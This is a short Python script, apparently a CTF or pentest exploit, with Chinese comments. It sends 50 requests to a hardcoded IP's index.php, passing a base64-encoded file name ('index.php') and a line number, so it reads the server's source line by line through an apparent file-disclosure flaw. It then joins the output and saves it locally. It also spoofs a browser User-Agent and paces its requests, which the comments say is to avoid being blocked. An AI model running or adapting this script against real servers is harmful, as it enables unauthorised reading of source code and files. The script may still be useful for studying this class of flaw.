import requests
import time

# 核心配置
BASE_URL = "http://171.80.2.169:18454/index.php"
FILENAME_PARAM = "aW5kZXgucGhw"  # filename固定值
REQUEST_COUNT = 50  # line从1到50
TIMEOUT = 15  # 单次请求超时时间（秒）
DELAY = 0.1  # 每次请求间隔（避免高频请求被拦截）

# 存储最终拼接结果
combined_result = ""

# 循环发送50次GET请求（line=1 到 line=50）
for line_num in range(1, REQUEST_COUNT + 1):
    # 构造请求参数
    params = {"line": line_num, "filename": FILENAME_PARAM}

    try:
        # 发送GET请求
        response = requests.get(
            url=BASE_URL,
            params=params,
            timeout=TIMEOUT,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            },
        )

        # 检查响应状态码（非200则抛出异常）
        response.raise_for_status()

        # 拼接响应内容（保留原始编码，避免乱码）
        response.encoding = response.apparent_encoding  # 自动识别编码
        combined_result += response.text

        # 打印进度
        print(f"✅ 第 {line_num} 次请求成功（line={line_num}）")

        # 请求间隔，降低服务器压力
        time.sleep(DELAY)

    except requests.exceptions.RequestException as e:
        # 捕获所有请求异常（超时、连接失败、4xx/5xx等）
        error_msg = f"❌ 第 {line_num} 次请求失败（line={line_num}）：{str(e)}"
        print(error_msg)
        # 失败时也记录标记，避免结果缺失
        combined_result += f"\n[请求line={line_num}失败：{str(e)}]\n"

# 输出最终拼接结果
print("\n" + "=" * 80)
print("最终拼接结果：")
print("=" * 80)
print(combined_result)

# 可选：将结果保存到本地文件（方便查看大内容）
with open("combined_result.txt", "w", encoding="utf-8") as f:
    f.write(combined_result)
print(f"\n📄 结果已保存到当前目录的 combined_result.txt 文件中")
